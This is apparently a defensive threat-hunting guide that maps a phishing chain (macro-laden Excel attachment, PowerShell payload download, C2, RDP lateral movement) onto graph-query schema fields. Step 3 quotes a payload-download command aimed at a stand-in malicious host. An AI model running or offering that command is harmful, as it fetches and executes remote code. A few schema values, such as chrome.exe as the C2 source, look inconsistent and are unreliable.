1. **Identify Initial Access via Email**  
   - Monitor for the creation of processes related to Outlook that involve email interactions. Specifically, look for emails with subject lines containing "Important Update" and attachments named "Invoice_2023.xlsx".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "Invoice_2023.xlsx"  

2. **Identify Opening of Malicious Attachment**  
   - Track events where Microsoft Excel is opened with macros enabled, specifically for the file "Invoice_2023.xlsx".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" (or similar path for Excel)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "Invoice_2023.xlsx"  
     - `relation`: "Process Create"  

3. **Detect Macro Execution and Payload Download**  
   - Monitor for PowerShell execution initiated by Excel that downloads a file from a remote server. Look for commands similar to `Invoke-WebRequest -Uri "http://malicious-server.com/payload.exe"`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "payload.exe"  
     - `relation`: "Process Create"  

4. **Identify Execution of the Malicious Payload**  
   - Monitor for the execution of the downloaded payload from the TEMP directory, specifically looking for process creation logs indicating the execution of "payload.exe".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\cmd.exe" (or similar for execution context)  
     - `dstNode.Type`: "Process"  
     - `dstNode.Image`: "$env:TEMP\\payload.exe"  
     - `relation`: "Process Create"  

5. **Detect Establishing Command and Control**  
   - Track network connections initiated by the payload to known malicious domains, specifically looking for outbound connections to "http://malicious-server.com".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" (or similar for web browsers)  
     - `dstNode.Type`: "Network"  
     - `dstNode.Dstaddress`: "malicious-server.com"  
     - `relation`: "TCP Connect"  

6. **Monitor for Data Exfiltration or Lateral Movement**  
   - Identify unusual file access patterns or RDP connections initiated from the compromised host, indicating potential data exfiltration or lateral movement.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\mstsc.exe" (for RDP)  
     - `dstNode.Type`: "Network"  
     - `dstNode.Dstaddress`: "target_ip_address" (replace with actual target IP)  
     - `relation`: "TCP Connect"  